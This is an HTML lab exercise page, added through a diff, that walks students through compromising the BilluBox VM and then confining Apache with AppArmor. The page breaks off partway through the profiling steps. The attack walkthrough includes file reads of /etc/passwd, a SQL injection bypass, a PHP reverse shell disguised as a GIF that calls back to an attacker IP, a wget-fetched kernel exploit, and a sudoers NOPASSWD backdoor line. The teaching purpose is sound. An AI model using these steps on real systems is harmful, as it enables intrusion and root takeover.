@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: AppArmor on BilluBox | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: AppArmor on BilluBox" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/billubox-apparmor/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/billubox-apparmor/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: AppArmor on BilluBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: AppArmor on BilluBox","url":"http://0.0.0.0:10000/exercises/billubox-apparmor/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: AppArmor on BilluBox</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+    <h2 id="before-you-start">Before you start</h2>
+
+<p>Please turn your sticker over, back to the not-yet-done side.</p>
+<p>Then start an lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 
+</p>
+    
+<p>Now suspend all other virtual machines:</p>
+
+<div class="language-shell highlighter-rouge"><div 
+class="highlight"><pre class="highlight">
+<code>/sync/bin/suspend-all-vms.sh </code>
+</pre></div>    </div>
+
+<p>And then start the virtual machine:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code>sudo virsh start billubox</code></pre></div>    </div>
+
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>On your Kali system, start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter.</p>
+</li>
+<li>
+<p>Start by port scanning the Billubox machine with nmap. The <code>-sT</code> flag asks for a TCP port scan. The <code>-p-</code> flag tells <code>nmap</code> to scan all 65,536 ports, not just the most commonly-used ports.  The <code>-sV</code> flag tells <code>nmap</code> to do a &quot;version scan,&quot; where it interacts with any open ports it finds, trying to determine what software is running and potentially what versions of that software. Finally, the <code>-Pn</code> flag tells <code>nmap</code> that it should scan the Billubox machine even if Billubox doesn't respond to pings.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sT</span> <span class="nt">-p-</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> billubox
+</code></pre></div></div>
+</li>
+<li>
+<p>Now we'll browse to the billubox web site, where we see a form that taunts us, telling us to prove our SQLi skills: <a href="http://billubox/">http://billubox/</a></p>
+</li>
+<li>
+<p>Instead, let's fire up <code>dirbuster</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirbuster
+</code></pre></div></div>
+</li>
+<li>
+<p>In the <code>dirbuster</code> window, fill out the target URL with <a href="http://billubox/">http://billubox/</a></p>
+</li>
+<li>
+<p>To complete the &quot;File with list of dirs/files&quot; box, choose the &quot;Browse&quot; box to its right, then navigate that window to <code>/usr/share/dirbuster/wordlists/</code> and choose <code>directory-list-2.3-small.txt</code>.</p>
+</li>
+<li>
+<p>Now click the &quot;Start&quot; button in the lower right corner of the dirbuster window, and then switch to the &quot;Results - List View&quot; tab.</p>
+</li>
+<li>
+<p>Our <code>dirbuster</code> run finds a number of PHP files that you can investigate later.  For now, let's take a look at <code>test.php</code>.  Anything that says &quot;test,&quot; &quot;dev,&quot; or &quot;debug&quot; is interesting to a penetration tester.</p>
+</li>
+<li>
+<p>Point your browser at: <a href="http://billubox/test.php">http://billubox/test.php</a></p>
+</li>
+<li>
+<p>We get back a response that says we're missing a file parameter. Let's try submitting one as a <code>GET</code> request:</p>
+</li>
+<li>
+<p>Use this link:  <a href="http://billubox/test.php?file=/etc/passwd">http://billubox/test.php?file=/etc/passwd</a></p>
+</li>
+<li>
+<p>Unfortunately, we get back the same response.  It must need a POST request.  We could start up Burpsuite or another man-in-the-middle proxy, but let's just use a <code>curl</code> command. Start a new terminal tab, then run this <code>curl</code> command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"file=/etc/passwd"</span> http://billubox/test.php
+</code></pre></div></div>
+</li>
+<li>
+<p>We get back the contents of the <code>/etc/passwd</code> file on this system! So we can read any file on the system that the web server can read.  Let's read the front page's source code, to see if we can figure out how a SQL injection attack might work for this:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"file=./index.php"</span> http://billubox/test.php
+</code></pre></div></div>
+</li>
+<li>
+<p>We can read the page and see that the SQL string is built from these three lines of code:</p>
+<pre><code>$uname=str_replace('\'','',urldecode($_POST['un']));
+$pass=str_replace('\'','',urldecode($_POST['ps']));
+$run='select * from auth where pass=\''.$pass.'\' and uname=\''.$uname.'\'';
+</code></pre></li>
+<li>
+<p>Think about the intent of those three lines of code.</p>
+<p>The first two lines receive the <code>un</code> and <code>ps</code> parameters from the POST request, do some decoding and filtering on them, and assign them to the variables <code>$uname</code> and <code>$pass</code>, respectively.</p>
+<p>The last line then queries a SQL database's <code>auth</code> table, which contains username and password combinations, asking for any lines where the <code>pass</code> column matches <code>$pass</code>'s contents and the <code>uname</code> column matches <code>$uname</code>'s contents.</p>
+<p>If this <code>select</code> command returns a matching line, then login is granted as that line's user.</p>
+<p>Our goal is to enter values for the form's <code>un</code> and <code>pass</code> variables that will, after going through the filtering, cause the <code>select</code> command to return one or more rows.</p>
+</li>
+<li>
+<p>The <code>str_replace()</code> removes single quotation marks, blocking the most common attack string for this, which would be <code>' OR 1=1 --</code>. Let's try replacing both <code>$user</code> and <code>$pass</code> with:</p>
+<pre><code> OR 1=1 -- \
+</code></pre>
+<p>Then the third line of code above would set <code>$run</code> to this, which makes the SQL statement return all rows in the <code>auth</code> table:</p>
+<pre><code>select * from auth where pass=' OR 1=1 -- \' and uname=' OR 1=1 -- \'
+</code></pre>
+<p>This can be difficult to follow, so if you're having trouble picturing this, keep reading the rest of this instruction.</p>
+<p>First, notice that the line is looking for any rows where pass is set to the following value, which has a single quote (') mark in it:</p>
+<pre><code>' OR 1=1 -- \' and uname='
+</code></pre>
+<p>So now let's simplify that. If you think of the string <code>OR 1=1 -- ' and uname=</code> as <code>FOO</code>, you can think of the <code>select</code> command as something that says:</p>
+<pre><code>select * from auth where pass='FOO' OR 1=1 -- \'
+</code></pre>
+<p>Next, recognize that the <code>--</code> is a comment field, so the SQL database is only trying to handle this command:</p>
+<pre><code>select * from auth where pass='FOO' OR 1=1
+</code></pre>
+<p>Since <code>1=1</code> is true for every row in the database's <code>auth</code> table, the <code>select</code> statement now returns every row.</p>
+</li>
+<li>
+<p>So lets try logging in to <a href="http://billubox/">http://billubox/</a> by setting both the username and password to <code>OR 1=1 -- \</code>:</p>
+<p>Press the following key sequence:  <code>(space)OR(space)1=1(space)--(space)\</code></p>
+</li>
+<li>
+<p>Now we're logged in and we've been sent to <a href="http://billubox/panel.php">http://billubox/panel.php</a>.  This page has two apparent functions.  One lets you add users, while the other shows you users that exist. Let's read its source code using the old <code>test.php</code> issue we found.</p>
+</li>
+<li>
+<p>In a terminal, run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"file=./panel.php"</span> http://billubox/test.php | less
+</code></pre></div></div>
+<p>It looks like the form here has an interesting situation.  The <code>load</code> parameter is placed into a choice variable.  The <code>load</code> parameter should only have two possible values, <code>add</code> and <code>show</code>, corresponding to the two apparent functions.  But if you put something else in that parameter, it will be run, by being included in the current PHP program.</p>
+<pre><code>$choice=str_replace('./','',$_POST['load']);
+
+if($choice==='add')
+{
+    include($dir.'/'.$choice.'.php');
+    die();
+}
+
+if($choice==='show')
+{
+    include($dir.'/'.$choice.'.php');
+    die();
+}
+else
+{
+    include($dir.'/'.$_POST['load']);
+}
+</code></pre>
+<p>So we've found a way to run PHP code if we can get it placed onto the target filesystem. How might we do that?</p>
+</li>
+<li>
+<p>You may have noticed that the user add functionality lets me upload a picture.  Let's take a look at how that function works.  If we continue looking at the <code>panel.php</code> source code, further down in the code, we see that uploaded image files are moved by <code>move_uploaded_file()</code> into <code>./uploaded_images/</code>. So could we upload a file with PHP code in it, by pretending it's the picture (image file) for a new user we are creating? Here's that line of code that shows the movement of uploaded image files.</p>
+<pre><code>if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
+</code></pre></li>
+<li>
+<p>Let's create a file with PHP code that looks like an image file. We can't put the right extension on the file, because <code>panel.php</code> checks to make sure that the file is actually an image. Luckily for us, it does that check using the PHP <code>finfo_file()</code> function, which is easily fooled.  If our uploaded &quot;image&quot; file's first line is <code>GIF89</code>, PHP's <code>finfo_file()</code> function will decide our file is a valid <code>GIF</code> file.  Create a <code>php-reverse.gif</code> file, starting with that magic <code>GIF89</code> line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"GIF89"</span> <span class="o">&gt;</span>php-reverse.gif
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, append the PHP reverse shell program from Kali Linux's <code>/usr/share/webshells/php/</code> directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/share/webshells/php/php-reverse-shell.php <span class="o">&gt;&gt;</span>php-reverse.gif
+</code></pre></div></div>
+</li>
+<li>
+<p>We need to change the stock destination IP address and port in that file. We can do that with the <code>sed</code> command. We use <code>'s/127.0.0.1/10.23.58.30/'</code> to tell <code>sed</code> to substitute any occurence of the regular expression <code>127.0.0.1</code> with the text <code>10.23.58.30</code>. We use <code>sed</code>'s <code>-i</code> flag to tell it to alter a file in-place. We then use a second <code>sed</code> command to do the same kind of substition for <code>1234</code>, changing it to <code>4444</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/10.23.58.30/'</span> php-reverse.gif
+<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/1234/4444/'</span> php-reverse.gif
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a netcat listener to catch the shell:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 4444
+</code></pre></div></div>
+</li>
+<li>
+<p>Now go back to the browser, which is logged into <code>panel.php</code>, and choose the &quot;Add User&quot; option, clicking continue.</p>
+</li>
+<li>
+<p>Click browse to upload your hostile <code>php-reverse.gif</code> image.</p>
+</li>
+<li>
+<p>Fill in any name and any postal address, then click the upload button.</p>
+</li>
+<li>
+<p>Now we need to trigger the <code>panel.php</code> POST with the load variable set to the path of our hostile <code>php-reverse.gif</code> image.  We won't use curl for this, because we want to use our current session state.</p>
+<p>Let's make this easier on ourselves and create a replica of the form components.  We've done this for you, basically by pulling down a copy of the form with <code>curl</code>, then adding this to the form tag: <code>action=&quot;http://billubox/panel.php&quot;</code>.  You can use the form we've created for you by copying this link into your browser's URL bar and hitting the enter key.</p>
+<p><a href="file:///root/Billubox-Exercise/panel-form.html">file:///root/Billubox-Exercise/panel-form.html</a></p>
+<p>Here are its contents:</p>
+<pre><code>&lt;HTML&gt;&lt;BODY&gt;
+&lt;form action=&quot;http://billubox/panel.php&quot; method=post&gt;
+&lt;input type=text name=load&gt;
+&lt;input type=submit name=continue value=&quot;continue&quot;&gt;
+&lt;/form&gt;
+</code></pre></li>
+<li>
+<p>Put this into the text field and click continue:</p>
+<pre><code>../../../../../../../var/www/uploaded_images/php-reverse.gif
+</code></pre></li>
+<li>
+<p>Now, go back to your terminal window, where you should have a Billubox shell waiting for you.</p>
+<p>At the very top of your shell output, you have a kernel version.  It's a very old version, 3.13.0:</p>
+<pre><code>Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
+</code></pre></li>
+<li>
+<p>Type <code>id</code> to see what user you have:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+<p>It looks like we've got user <code>www-data</code>.  Let's find a path to <code>root</code>.</p>
+</li>
+<li>
+<p>Start up a new terminal window or tab and search exploitdb for this, using the local cache of exploitdb on our Kali boxes:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit 3.13.0
+</code></pre></div></div>
+<p>This tell us that we have an available exploit at:</p>
+<pre><code>/usr/share/exploitdb/exploits/linux/local/37292.c
+</code></pre></li>
+<li>
+<p>Switch to the <code>Billubox-Exercise</code> directory and copy the exploit file <code>37292.c</code> there:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root/Billubox-Exercise/
+<span class="nb">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c <span class="nb">.</span> 
+</code></pre></div></div>
+</li>
+<li>
+<p>Now stage a web server hosting the <code>37292.c</code> exploit source code:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+</li>
+<li>
+<p>In the terminal window/tab where you have your Billubox shell, pull down the exploit:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+wget http://10.23.58.30/37292.c
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, compile the exploit on Billubox and run the exploit against Billubox's kernel:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-o</span> exploit 37292.c
+./exploit
+</code></pre></div></div>
+</li>
+<li>
+<p>Congratulations! You've got root.  Now let's turn around and cut off an another attacker's ability to do what we just did, but proactively. We'll use AppArmor to create a profile for this web application so it can't run shell commands.</p>
+</li>
+<li>
+<p>To start, add a user to the system:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>useradd <span class="nt">-m</span> user
+passwd user
+</code></pre></div></div>
+</li>
+<li>
+<p>Set a password that you'll remember, like, say, <code>user</code>, then add the user to the sudoers file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"user ALL=(ALL) NOPASSWD:ALL"</span> <span class="o">&gt;&gt;</span>/etc/sudoers
+</code></pre></div></div>
+</li>
+<li>
+<p>We are now going to create two terminal sessions to Billubox.  One will be for running <code>aa-genprof</code>, while the other will be for controlling or running the program we are going to exercise. We will ask you to start new terminal windows or tabs.</p>
+</li>
+<li>
+<p>Open up a new terminal window/tab on your Kali system and <code>ssh</code> into the billubox:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh user@billubox
+</code></pre></div></div>
+</li>
+<li>
+<p>Sudo to the <code>root</code> user, using the hypen (-) to get <code>root</code>'s environment settings:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>Start up a second terminal window/tab and then do the same thing:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh user@billubox
+</code></pre></div></div>
+</li>
+<li>
+<p>Sudo to the <code>root</code> user, using the hypen (-) to get <code>root</code>'s environment settings:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's lock this system down now, using AppArmor. Let's figure out what process gave us that shell as the <code>www-data</code> user.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="nt">-ef</span> | <span class="nb">grep </span>www-dat[a]
+</code></pre></div></div>
+<p>The first shell we got on the system is in this readout, listed as:</p>
+<pre><code>sh -c uname -a; w; id; /bin/sh -i
+</code></pre>
+<p>Its parent process is one that runs <code>apache2</code>.  We can give <code>apache2</code> an AppArmor profile that will stop Apache from running a shell.</p>
+</li>
+<li>
+<p>To start our exercise, end the netcat session that has the ill-gotten <code>root</code> shell in it by typing <code>exit</code> in that terminal window:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>In your browser, log out of the billubox <code>panel.php</code> page using the logout button. Close all browser windows that are communicating with Billubox, for good measure.</p>
+</li>
+<li>
+<p>In the first billubox SSH session window, start up the AppArmor profile generator, <code>aa-genprof</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aa-genprof /usr/sbin/apache2
+</code></pre></div></div>
+</li>
+<li>
+<p>In the second billubox SSH session window, restart the Apache web server:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/init.d/apache2 stop
+/etc/init.d/apache2 start
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's exercise the application, without attacks, to ensure the AppArmor profile covers the expected, non-attack activity.</p>
+</li>
+<li>
+<p>Start a fresh browser window and clear the cache, as shown below.There's a missing step 1.5, which is to click on &quot;Settings&quot;.</p>
+<p><img src="/assets/img/firefox-clear-cache.jpg" alt="Clear Cache in Firefox" /></p>
+</li>
+<li>
+<p>Log in at this URL, using credentials <code>biLLu</code> and <code>hEx_it</code></p>
+<p><a href="http://billubox/">http://billubox/</a></p>
+</li>
+<li>
+<p>For extra credit, after class is over, find another attack path on this virtual machine that gets you those application credentials.</p>
+</li>
+<li>
+<p>You'll now land on <code>panel.php</code> legitimately.  The drop-down menu will have &quot;Show Users&quot; available, so click continue to exercise that functionality.</p>
+</li>
+<li>
+<p>You'll see the original users this machine shipped with, as well as the one you added to upload your shell.  Don't worry about this for now.</p>
+</li>
+<li>
+<p>Now switch the drop-down menu to &quot;Add User&quot; and click continue to exercise that functionality.</p>
+</li>
+<li>
+<p>Click Browse and choose that same fake gif file you created earlier.</p>
+</li>
+<li>
+<p>Leave name and address at their defaults, but change the <code>1337</code> field to <code>1338</code>.</p>
+</li>
+<li>
+<p>Now click &quot;Upload&quot;, then the &quot;Logout&quot; button.</p>
+</li>
+<li>
+<p>Go back into your second Billubox SSH session (not the one running <code>aa-genprof</code>) and stop the Apache2 daemon, to capture its shutdown activities.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/init.d/apache2 stop
+</code></pre></div></div>
+</li>
+<li>
+<p>We're now finished exercising the Apache daemon.  Go to your first Billubox SSH session, where <code>aa-genprof</code> is running, and hit <code>S</code> to scan for AppArmor events.</p>
+</li>
+<li>
+<p>These events won't necessarily occur in exactly the same order for you.  We've put them in text blocks to make them easier to find. This is the result of one of our test runs. Here's what happened – as you get questions from <code>aa-genprof</code>, answer in the way that we have, please:</p>
+<ul>
+<li>
+<p><strong>Capability: net_bind_service</strong></p>
+<ul>
+<li><code>aa-genprof</code> will notice that Apache needs the <code>net_bind_service</code> root capability, to bind to a port below 1024. It asks if you want to generalize that to everything in the NIS abstraction include file.  Don't generalize - <code>hit 2</code>, then <code>hit A</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Capability: setgid</strong></p>
+<ul>
+<li><code>aa-genprof</code> will ask if you want to allow the Apache webserver to set its own GID, so it can drop from running as <code>root</code> to the <code>www-data</code> group -- we do want this.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong>Capability: setuid</strong></p>
+<ul>
+<li><code>aa-genprof</code> will ask if you want to allow the Apache webserver to set its own UID, so it can drop from running as <code>root</code> to the <code>www-data</code> user -- we do want this.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/apache2/apache2.conf</code></strong></p>
+<ul>
+<li><code>aa-genprof</code> will ask you about letting Apache read <code>/etc/apache2/apache2.conf</code>. Let's generalize this to all of <code>/etc/apache2</code>.  <code>Hit G</code> to replace this with a glob for <code>/etc/apache2/*</code>, then <code>hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/apache2/conf.d/ANYFILE</code></strong></p>
+<ul>
+<li><code>aa-genprof</code> will ask you about an individual file in  <code>/etc/apache2/conf.d</code>. Let's generalize this to all of <code>/etc/apache2/conf.d/</code>.  <code>Hit G</code> to replace this with a glob for <code>/etc/apache2/conf.d/*</code>, then <code>hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/apache2/conf.d/</code> directory access</strong></p>
+<ul>
+<li>
+<p><code>aa-genprof</code> will ask you about the directory <code>/etc/apache2/conf.d/</code>. Let's tell <code>aa-genprof</code> that we mean business, and enter a new path that allows us to use a <code>**</code> glob, which means all subdirectories.  (Unfortunately, this won't cover <code>/etc/apache2/</code> itself, just its contents.)</p>
+</li>
+<li>
+<p><code>Hit N</code> to enter a new path and enter:</p>
+<pre><code>/etc/apache2/**   &lt;enter key&gt;
+</code></pre></li>
+<li>
+<p><code>Hit A</code> to allow.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/group</code></strong></p>
+<ul>
+<li>
+<p><code>aa-genprof</code> will ask you about reading <code>/etc/group</code>.  It will give you two options for abstractions. In your other terminal window, go review the two abstraction include files offered.  First, switch into the abstractions directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /etc/apparmor.d/abstractions/
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, read the <code>apache2-common</code> abstraction file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less apache2-common
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's not choose <code>apache2-common</code>, since that defeats some of the point of this exercise. Let's read the <code>nameservice</code> abstraction file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less nameservice
+</code></pre></div></div>
+</li>
+<li>
+<p>The nameservice abstraction includes these other abstractions (<code>nis ldapclient winbind likewise mdns ssl_certs</code>), but it's fairly safe.  Dig into these other abstractions if you like, looking especially for program execution capabilities or file write capabilities.</p>
+</li>
+<li>
+<p><strong>Note</strong>: one can search for lines that let the program run other programs  like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'px|Px|ix|ux|Ux|cx|Cx'</span> nameservice nis ldapclient winbind likewise mdns ssl_certs
+</code></pre></div></div>
+</li>
+<li>
+<p>Here's our analysis:</p>
+<ul>
+<li>
+<p>We're most concerned about letting the Apache server write to files or execute programs.  The nameservice abstraction only allows execution of programs matching these two globs: <code>/var/run/nscd/db*</code> and <code>/run/nscd/db*</code>, but it doesn't allow writing to those files.</p>
+</li>
+<li>
+<p>Via some of its include files, the nameservice abstraction allows writing to these files:</p>
+<pre><code>/{,var/}run/{.,}nscd_socket
+/var/lib/likewise-open/lwidentity_privileged/pipe
+/var/{lib,run}/samba/winbindd_privileged/pipe
+/tmp/.winbindd/pipe
+/tmp/.lwidentity/pipe
+/{,var/}run/avahi-daemon/socket
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p>We would get a tighter profile if we skipped this abstraction and just accepted individual lines, since many of the allowed file accesses come from abstractions we don't need. None of these rules allow the exploit path we've used, so choose the abstraction for simplicity.</p>
+</li>
+<li>
+<p>In the <code>aa-genprof</code> terminal, <code>hit 2</code> to choose the nameserver abstraction then <code>hit A</code> for allow.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/mime.types</code></strong></p>
+<ul>
+<li>We're asked to let Apache read the <code>/etc/mime.types</code> file, so it can make an attempt to tell if an uploaded file is truly an image file.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/php5/apache2filter/php.ini</code></strong></p>
+<ul>
+<li>We're asked if we'd like to allow Apache to read the <code>/etc/php5/apache2filter/php.ini</code> file. PHP needs this file, as this is its main configuration file.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/etc/php5/conf.d/</code> directory access</strong></p>
+<ul>
+<li><code>aa-genprof</code> asks about <code>/etc/php5/conf.d/</code>, offering the php5 abstraction as well. The abstraction doesn't have any writes or executes, so we'll choose it. You could get a tighter filter by skipping the abstraction and just allowing access to the four files <code>aa-genprof</code> will ask about.  For this exercise, choose the abstraction (#include &lt;abstractions/php5&gt;), then <code>hit A</code> for allow.</li>
+</ul>
+</li>
+<li>
+<p><strong>PID file access</strong></p>
+<ul>
+<li><code>aa-genprof</code> asks about Apache's PID file, where it writes a PID upon startup.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong>TMP file access</strong></p>
+<ul>
+<li>
+<p>We're asked about a <code>/tmp/phpXXXXXX</code> file (where the X's in <code>XXXXXX</code> are random characters) that the PHP interpreter wants to both read and write. It's likely that if we don't generalize enough, we’ll run into problems. On the other hand, it's a bit dicey because we're letting PHP both read and write to a location that's reliably world-writable and thus useful to exploits.  Let's try to create a loose-enough and tight-enough pattern. You could use `/tmp/php</p>
+</li>
+<li>
+<p><code>Hit N</code> for new, then enter:</p>
+<pre><code>/tmp/php* &lt;enter key&gt;
+</code></pre></li>
+<li>
+<p><code>Hit A</code> to allow.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/usr/lib/apache2/modules/mod_alias.so</code></strong></p>
+<ul>
+<li>Apache wants to read one of its module files (<code>mod_alias.so</code>) Let's generalize, but not as much as <code>aa-genprof</code> is suggesting. <code>Hit 1</code> to edit the <code>/usr/lib/apache2/modules/mod_alias.so</code> line, then <code>hit G</code> to glob that to the entire <code>/usr/lib/apache2/modules/</code> directory, then <code>hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/usr/lib/php5/20090626\+lfs/mysql.so</code></strong></p>
+<ul>
+<li>
+<p>Apache wants to read a PHP library: <code>/usr/lib/php5/20090626\+lfs/mysql.so</code></p>
+</li>
+<li>
+<p>This should have been covered by the PHP5 abstraction, but <code>aa-genprof</code> doesn't always remember that you've already approved an abstraction.  <code>Hit 1</code> to choose the abstraction, then <code>hit A</code> for allow.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/log/apache2/access.log</code></strong></p>
+<ul>
+<li>Apache asks to write to its access log at <code>/var/log/apache2/access.log</code>. This is a 'write' operation, which is more dangerous than a 'read', so we're not going to generalize.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/log/apache2/other_vhosts_access.log</code></strong></p>
+<ul>
+<li>Apache asks to write to another access log at <code>/var/log/apache2/other_vhosts_access.log</code>.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/log/apache2/error.log</code></strong></p>
+<ul>
+<li>Apache asks to write to its error log at <code>/var/log/apache2/error.log</code>.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/www/add.php</code></strong></p>
+<ul>
+<li>Apache wants to read the <code>/var/www/add.php</code>. Let's <code>hit G</code> to glob that to <code>/var/www/*</code>, then <code>hit A</code> to allow. We could have instead <code>hit N</code> and enter <code>/var/www/**</code>, but if we look at this site, it only has one subdirectory, so we don't need to be that general.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/www/</code></strong></p>
+<ul>
+<li>Apache wants to read the <code>/var/www</code> directory.  <code>Hit A</code> to allow.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/www/images/</code> &amp; <code>/var/www/uploaded_images/</code></strong></p>
+<ul>
+<li>
